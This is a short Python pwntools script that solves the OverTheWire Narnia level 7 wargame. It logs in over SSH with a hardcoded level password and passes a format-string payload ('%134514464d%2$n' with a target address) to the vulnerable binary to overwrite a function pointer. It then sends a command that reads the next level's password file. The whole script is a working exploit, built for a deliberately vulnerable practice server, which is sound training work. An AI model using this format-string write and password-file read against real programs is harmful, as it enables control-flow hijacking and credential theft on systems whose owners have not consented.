import pwn
s=pwn.ssh(user='narnia7', password='ahkiaziphu', host='narnia.labs.overthewire.org', port=2226)
#address to overwrite(eip) and then the function pointer(in hex -4) to where we want to#go to and %2$n to go up 2 places in the stack to overwrite eip
sh=s.run(b'/narnia/narnia7 $(python -c \'print "\x38\xdc\xff\xff%134514464d%2$n"\')')
print(sh.recv(timeout=5))
sh.sendline('cat /etc/narnia_pass/narnia8')
print(sh.recv(timeout=5))
flag=sh.recvline().decode('utf-8')[1:]
s.close()
pwn.log.info("Flag is: "+flag)
